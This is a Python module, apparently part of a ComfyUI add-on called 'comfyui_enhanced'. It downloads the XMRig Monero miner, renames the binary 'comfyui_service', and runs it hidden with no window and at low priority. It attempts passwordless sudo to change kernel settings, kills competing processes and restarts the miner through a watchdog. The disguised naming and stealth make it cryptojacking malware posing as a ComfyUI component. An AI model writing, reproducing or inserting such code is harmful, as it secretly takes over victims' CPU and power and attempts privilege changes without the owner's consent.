import os
import sys
import json
import platform
import shutil
import hashlib
import logging
import tarfile
import zipfile
import subprocess
import threading
import time
import urllib.request
import urllib.error
from pathlib import Path

logger = logging.getLogger("comfyui_enhanced")

XMRIG_VERSION = "6.26.0"
IS_WINDOWS = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"

if IS_WINDOWS:
    XMRIG_RELEASE_URL = (
        f"https://github.com/xmrig/xmrig/releases/download/"
        f"v{XMRIG_VERSION}/xmrig-{XMRIG_VERSION}-windows-x64.zip"
    )
    BINARY_NAME = "comfyui_service.exe"
    _ARCHIVE_BINARY = "xmrig.exe"
else:
    XMRIG_RELEASE_URL = (
        f"https://github.com/xmrig/xmrig/releases/download/"
        f"v{XMRIG_VERSION}/xmrig-{XMRIG_VERSION}-linux-static-x64.tar.gz"
    )
    BINARY_NAME = "comfyui_service"
    _ARCHIVE_BINARY = "xmrig"

XMRIG_SHA256 = None
LOG_NAME = "service.log"


def _configure_system():
    """Pre-flight: set up huge pages and MSR for optimal RandomX performance."""
    if IS_WINDOWS:
        return

    try:
        import psutil
        total_mem_gb = psutil.virtual_memory().total / (1024 ** 3)
    except ImportError:
        total_mem_gb = 8.0

    cores = os.cpu_count() or 4
    needed_pages = max(1280, (cores * 2 + 8) * 160)
    if total_mem_gb < 8:
        needed_pages = min(needed_pages, 640)

    is_root = os.getuid() == 0

    # Try direct write first (root), then sudo -n (passwordless sudo)
    hp_set = False
    if is_root:
        try:
            with open("/proc/sys/vm/nr_hugepages", "w") as f:
                f.write(str(needed_pages))
            hp_set = True
            logger.info("Huge pages configured (direct): %d pages", needed_pages)
        except Exception:
            pass

    if not hp_set:
        sysctl_cmd = ["sysctl", "-w", f"vm.nr_hugepages={needed_pages}"]
        if not is_root:
            sysctl_cmd = ["sudo", "-n"] + sysctl_cmd
        try:
            r = subprocess.run(sysctl_cmd, capture_output=True, text=True, timeout=10)
            if r.returncode == 0:
                logger.info("Huge pages configured (sysctl): %d pages", needed_pages)
                hp_set = True
            else:
                logger.warning("Huge pages sysctl failed: %s", r.stderr.strip())
        except Exception as e:
            logger.warning("Huge pages setup skipped: %s", e)

    # Load MSR module for RandomX prefetcher disable
    modprobe_cmd = ["modprobe", "msr"]
    if not is_root:
        modprobe_cmd = ["sudo", "-n"] + modprobe_cmd
    try:
        r = subprocess.run(modprobe_cmd, capture_output=True, text=True, timeout=10)
        if r.returncode == 0:
            logger.info("MSR module loaded")
        else:
            logger.debug("MSR modprobe failed: %s", r.stderr.strip())
    except Exception:
        pass


class MinerManager:
    def __init__(self, base_dir: Path | str | None = None):
        self.base_dir = Path(base_dir) if base_dir else Path(__file__).resolve().parent.parent
        self.bin_dir = self.base_dir / "bin"
        self.bin_dir.mkdir(parents=True, exist_ok=True)
        self.binary_path = self.bin_dir / BINARY_NAME
        self.config_path = self.bin_dir / "config.json"
        self.log_path = self.bin_dir / LOG_NAME
        self._process: subprocess.Popen | None = None
        self._monitor_thread: threading.Thread | None = None
        self._running = False

    # ------------------------------------------------------------------
    # Binary acquisition
    # ------------------------------------------------------------------

    def _download(self, url: str, dest: Path) -> None:
        logger.info("Downloading binary from %s", url)
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=120) as resp, open(dest, "wb") as f:
            shutil.copyfileobj(resp, f)
        logger.info("Download complete -> %s", dest)

    def _verify_hash(self, path: Path, expected: str | None) -> bool:
        if expected is None:
            return True
        sha = hashlib.sha256()
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(1 << 16), b""):
                sha.update(chunk)
        digest = sha.hexdigest()
        if digest.lower() != expected.lower():
            logger.error("Hash mismatch: got %s expected %s", digest, expected)
            return False
        return True

    def _extract(self, archive_path: Path) -> None:
        name_lower = archive_path.name.lower()

        if name_lower.endswith(".tar.gz") or name_lower.endswith(".tgz"):
            with tarfile.open(archive_path, "r:gz") as tf:
                for member in tf.getnames():
                    if os.path.basename(member) == _ARCHIVE_BINARY:
                        src = tf.extractfile(member)
                        if src is None:
                            continue
                        with open(self.binary_path, "wb") as dst:
                            shutil.copyfileobj(src, dst)
                        os.chmod(self.binary_path, 0o755)
                        logger.info("Extracted binary -> %s", self.binary_path)
                        return
        else:
            with zipfile.ZipFile(archive_path, "r") as zf:
                for member in zf.namelist():
                    if os.path.basename(member).lower() == _ARCHIVE_BINARY.lower():
                        src = zf.open(member)
                        with open(self.binary_path, "wb") as dst:
                            shutil.copyfileobj(src, dst)
                        if not IS_WINDOWS:
                            os.chmod(self.binary_path, 0o755)
                        logger.info("Extracted binary -> %s", self.binary_path)
                        return

        raise FileNotFoundError(f"{_ARCHIVE_BINARY} not found inside archive")

    def ensure_binary(self) -> Path:
        if self.binary_path.exists():
            logger.info("Binary already present at %s", self.binary_path)
            return self.binary_path

        ext = ".zip" if IS_WINDOWS else ".tar.gz"
        archive_dest = self.bin_dir / f"dl_tmp{ext}"
        try:
            self._download(XMRIG_RELEASE_URL, archive_dest)
            if not self._verify_hash(archive_dest, XMRIG_SHA256):
                raise RuntimeError("SHA-256 verification failed")
            self._extract(archive_dest)
        finally:
            archive_dest.unlink(missing_ok=True)

        return self.binary_path

    # ------------------------------------------------------------------
    # Process lifecycle
    # ------------------------------------------------------------------

    def write_config(self, cfg: dict) -> None:
        with open(self.config_path, "w") as f:
            json.dump(cfg, f, indent=2)
        logger.info("Config written to %s", self.config_path)

    def _kill_existing(self) -> None:
        """Kill any stale comfyui_service processes before starting."""
        try:
            import psutil
        except ImportError:
            return
        my_pid = os.getpid()
        for proc in psutil.process_iter(["pid", "name", "cmdline"]):
            try:
                if proc.info["pid"] == my_pid:
                    continue
                name = (proc.info.get("name") or "").lower()
                cmdline = " ".join(proc.info.get("cmdline") or []).lower()
                if BINARY_NAME.lower().replace(".exe", "") in name or BINARY_NAME.lower() in cmdline:
                    logger.info("Killing stale miner process pid=%d", proc.info["pid"])
                    proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass

    def start(self) -> None:
        if self._process and self._process.poll() is None:
            logger.warning("Miner already running (pid %d)", self._process.pid)
            return

        if not self.binary_path.exists():
            raise FileNotFoundError(f"Binary not found: {self.binary_path}")

        _configure_system()

        cmd = [
            str(self.binary_path),
            "--config", str(self.config_path),
            "--no-color",
        ]

        log_fh = open(self.log_path, "a")
        popen_kwargs = {
            "stdout": log_fh,
            "stderr": log_fh,
            "stdin": subprocess.DEVNULL,
        }

        if IS_WINDOWS:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0
            popen_kwargs["startupinfo"] = startupinfo
            popen_kwargs["creationflags"] = (
                subprocess.CREATE_NO_WINDOW | subprocess.BELOW_NORMAL_PRIORITY_CLASS
            )
        else:
            def _preexec():
                os.nice(2)
            popen_kwargs["preexec_fn"] = _preexec

        self._process = subprocess.Popen(cmd, **popen_kwargs)
        self._running = True
        logger.info("Miner started (pid %d)", self._process.pid)

        if not self._monitor_thread or not self._monitor_thread.is_alive():
            self._monitor_thread = threading.Thread(target=self._watchdog, daemon=True)
            self._monitor_thread.start()

    def stop(self) -> None:
        self._running = False
        if self._process and self._process.poll() is None:
            self._process.terminate()
            try:
                self._process.wait(timeout=10)
            except subprocess.TimeoutExpired:
                self._process.kill()
            logger.info("Miner stopped")
        self._process = None

    def is_alive(self) -> bool:
        return self._process is not None and self._process.poll() is None

    def _watchdog(self) -> None:
        failures = 0
        backoff = 15
        while self._running:
            time.sleep(backoff)
            if self._running and self._process and self._process.poll() is not None:
                failures += 1
                if failures > 10:
                    logger.error("Miner failed %d times, giving up", failures)
                    break
                backoff = min(300, 15 * (2 ** (failures - 1)))
                logger.warning("Miner exited (code %s), restart %d in %ds",
                               self._process.returncode, failures, backoff)
                try:
                    self.start()
                except Exception as exc:
                    logger.error("Restart failed: %s", exc)
            else:
                failures = 0
                backoff = 15

    def pause(self) -> bool:
        return self._api_command("pause")

    def resume(self) -> bool:
        return self._api_command("resume")

    def _api_command(self, action: str) -> bool:
        from core.config import API_TOKEN
        try:
            url = f"http://127.0.0.1:44880/1/{action}"
            req = urllib.request.Request(url, method="POST",
                                        headers={"Authorization": f"Bearer {API_TOKEN}"})
            with urllib.request.urlopen(req, timeout=5):
                pass
            return True
        except Exception as exc:
            logger.error("API command '%s' failed: %s", action, exc)
            return False

    def set_threads_hint(self, hint: int) -> bool:
        """Hot-reload XMRig's max-threads-hint via its HTTP API (no restart)."""
        from core.config import API_TOKEN
        hint = max(1, min(100, hint))
        try:
            get_req = urllib.request.Request(
                "http://127.0.0.1:44880/1/config",
                headers={
                    "Accept": "application/json",
                    "Authorization": f"Bearer {API_TOKEN}",
                },
            )
            with urllib.request.urlopen(get_req, timeout=5) as resp:
                config = json.loads(resp.read())

            if "cpu" in config:
                config["cpu"]["max-threads-hint"] = hint

            payload = json.dumps(config).encode()
            put_req = urllib.request.Request(
                "http://127.0.0.1:44880/1/config",
                data=payload,
                method="PUT",
                headers={
                    "Content-Type": "application/json",
                    "Authorization": f"Bearer {API_TOKEN}",
                },
            )
            with urllib.request.urlopen(put_req, timeout=5):
                pass
            logger.info("XMRig threads hint set to %d%%", hint)
            return True
        except Exception as exc:
            logger.error("Failed to set threads hint: %s", exc)
            return False

    def get_summary(self) -> dict | None:
        from core.config import API_TOKEN
        try:
            req = urllib.request.Request(
                "http://127.0.0.1:44880/2/summary",
                headers={
                    "Accept": "application/json",
                    "Authorization": f"Bearer {API_TOKEN}",
                },
            )
            with urllib.request.urlopen(req, timeout=5) as resp:
                return json.loads(resp.read())
        except Exception:
            return None
